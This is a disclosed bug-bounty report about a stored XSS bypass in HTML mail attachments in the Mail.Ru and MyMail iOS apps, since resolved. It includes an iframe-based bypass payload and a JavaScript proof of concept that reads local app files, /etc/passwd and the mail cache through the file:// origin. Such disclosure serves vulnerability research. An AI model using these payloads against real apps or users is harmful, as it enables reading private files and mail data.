---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '243058'
original_report_id: '243058'
title: XSS bypass Script execute,Read any file,execute any javascript code--UXSS
weakness: Cross-site Scripting (XSS) - Stored
team_handle: mailru
created_at: '2017-06-25T15:46:57.258Z'
disclosed_at: '2018-01-27T15:01:31.453Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
asset_identifier: ru.mail.mail
asset_type: APPLE_STORE_APP_ID
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS bypass Script execute,Read any file,execute any javascript code--UXSS

## Metadata

- HackerOne Report ID: 243058
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: mailru
- Disclosed At: 2018-01-27T15:01:31.453Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Mail attachment  XSS bypass vulnerability--UXSS

Vulnerability impact：
Mail.Ru Mail for iOS
MyMail for iOS

explain:
Mail app supports HTML attachments, however，Cannot execute javascript.
for example
<script>alert(/xss/)</script>
<img src=# onerror=alert(/xss/)>
These statements can not be executed in the html attachments...LOL

However, the addition of a statement can execute the scriptjavascript.
I did not understand it now
Is this sentence：
<iframe SRC=#></iframe>
has this, javascript can execute....
The other will not work，eg:
<iframe src=1></iframe>
or 
<iframe src=http://www.google.com></iframe>

the xss is file:// domain, so read any file.
no same-origin policy,access to ant web origin and local files;
testing：
Write an email
Add an HTML attachment
send

HTML attachment content:
<iframe SRC=# ></iframe>
<script>alert(/xss/)</script>

HTML attachment can execute javascript.

read file poc:

function GetMailAddress(mailcontent){
	var content_reg = new RegExp("\\w+\@\\w+\\.\\w+",'g');
    alert(mailcontent.replace('/\s/g','').replace('/\S/g','').match(content_reg));
}
	
function read_file(read_file_path,tag){
    var oReq = new XMLHttpRequest();
    oReq.addEventListener("load", function(){
		if (tag === true){
		GetMailAddress(this.responseText);
		} else {
			alert(this.responseText);
		}
		}
	);
    oReq.open("GET", read_file_path);
    oReq.send();
}

    var Lib_file_path = location.href.split('Library')[0] + 'Library';
    var mail_plist_file = Lib_file_path + '/Preferences/ru.mail.mail.plist';
	var passwd_file = 'file:///etc/passwd';
    var cache_passwd = Lib_file_path + '/Caches/ru.mail.mail/Cache.db';
	read_file(mail_plist_file,true);
	read_file(passwd_file,false);
	read_file(cache_passwd,false);



For more information, please see the attachment of my report

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
